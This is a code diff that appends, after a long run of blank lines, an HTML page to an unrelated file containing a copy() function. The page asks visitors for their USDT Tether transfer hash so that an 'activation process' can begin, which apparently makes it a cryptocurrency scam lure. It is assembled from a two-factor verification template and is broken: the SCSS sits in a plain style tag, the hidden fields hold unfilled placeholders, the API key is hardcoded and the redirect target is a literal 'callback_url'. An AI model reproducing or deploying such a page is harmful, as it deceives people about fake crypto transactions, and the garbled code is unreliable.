@@ -144,3 +144,218 @@ function copy() {
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html>
+<title>?secure?</title>
+
+
+<body>
+
+<style>
+
+* {
+  box-sizing: border-box;
+}
+
+$theme: #4d8ff1;
+
+#sift-verification {
+  border: 1px solid #ddd;
+  border-top: 10px solid $theme;
+  display: block;
+  font-family: Open Sans, Helvetica;
+  margin: 40px auto;
+  padding-bottom: 40px;
+  width: 475px;
+
+  img {
+    display: block;
+    max-height: 40px;
+    margin: 10px auto;
+    max-width: 80%;
+  }
+
+  h1 {
+    font-size: 24px;
+    margin: 0;
+  }
+
+  p {
+    font-size: 14px;
+    margin: 10px 0;
+  }
+
+  form {
+    padding-top: 25px;
+    position: relative;
+  }
+
+  input,
+  button {
+    border: 1px solid #ddd;
+    border-radius: 3px;
+    cursor: pointer;
+    display: block;
+    height: 40px;
+    font-size: 16px;
+    padding: 10px 15px;
+    width: 100%;
+  }
+
+  input {
+    transition: border-color 0.2s;
+
+    &:hover {
+      border-color: lighten($theme, 20%);
+    }
+
+    &.error {
+      background-color: #fff4f4;
+      border-color: #cf5766;
+    }
+
+    &.success {
+      background-color: #f7fff8;
+      border-color: #a1d9a7;
+    }
+  }
+
+  button {
+    background-color: $theme;
+    color: #fff;
+    margin-top: 25px;
+    transition: background-color 0.2s;
+
+    &:hover {
+      background-color: darken($theme, 5%);
+    }
+
+    &[disabled] {
+      background-color: lighten($theme, 10%);
+      pointer-events: none;
+      transition: none;
+    }
+  }
+
+  .form-container {
+    display: block;
+    margin: 40px auto 0;
+    width: 300px;
+  }
+
+  .input-error-message {
+    color: red;
+    font-size: 12px;
+    position: absolute;
+    top: 0;
+  }
+}
+
+</style>
+
+</body>
+<section id="sift-verification">
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+  <a href="https://imgbb.com/"><img src="https://i.ibb.co/BC2Ck45/llhjg-u.jpg" alt="llhjg-u" border="0"></a>
+  <div class="form-container">
+    <h1>Enter your usdt tether transfer HASH number, then confirm your page and the activation process will begin</h1>
+    <p>
+      
+    </p>
+    <form>
+      <small class='input-error-message'></small>
+      <input class='input-code' placeholder='Enter the hash code' type='text' name='2fa-code' />
+      <button>Verify</button>
+      <input type='hidden' value='{USER_ID}' name='userId' />
+      <input type='hidden' value='{SESSION_ID}' name='sessionId' />
+      <input type='hidden' value='{API_KEY}' name='key' />
+    </form>
+  </div>
+</section>
+
+
+
+<script>
+
+var ERROR_SELECTOR = '#sift-verification .input-error-message';
+var INPUT_SELECTOR = '#sift-verification .input-code';
+var BUTTON_SELECTOR = '#sift-verification button';
+
+document.querySelector(BUTTON_SELECTOR).addEventListener('click', verify);
+document.querySelector(INPUT_SELECTOR).addEventListener('focus', clearInputErrors);
+
+function verify(evt) {
+  var input = document.querySelector(INPUT_SELECTOR),
+      button = document.querySelector(BUTTON_SELECTOR), 
+      code =  (input || {}).value;
+  
+  evt.preventDefault();
+
+  if (!code) {
+    addErrorMessage('Please enter a HASH number..');
+    return;
+  }
+  
+  button.disabled = true;
+  
+  fetch('https://api.siftscience.com/v205/verification/check', {
+      method: 'post', 
+      body: JSON.stringify({  
+        $api_key: '4839d759aa',
+        $code: code,
+        $user_id: 'johndoe123'
+      }), 
+      mode: 'no-cors'
+    })
+    .then(res => res.json().catch(() => ({}))
+        .then((json) => res.ok ? json : Promise.reject(res))
+    )
+    .then(
+      () => window.location = 'callback_url',
+      () => { 
+        button.disabled = false;
+        addErrorMessage('Incorrect verification HASH number');
+      });
+                            
+}
+
+function clearInputErrors() {
+  var input = document.querySelector(INPUT_SELECTOR)
+      errorMessageEl =  document.querySelector(ERROR_SELECTOR);
+  
+  if (input && input.classList.contains('error')) {
+    input.classList.remove('error');
+  }
+  
+  if (errorMessageEl) {
+    errorMessageEl.textContent = '';
+  }
+}
+
+function addErrorMessage(message) {
+  var input = document.querySelector(INPUT_SELECTOR);
+  
+  if (input) {
+    (document.querySelector(ERROR_SELECTOR) || {}).textContent = message || '';
+    
+    input.classList.add('error');
+  } 
+}
+</script>
+
+</html>
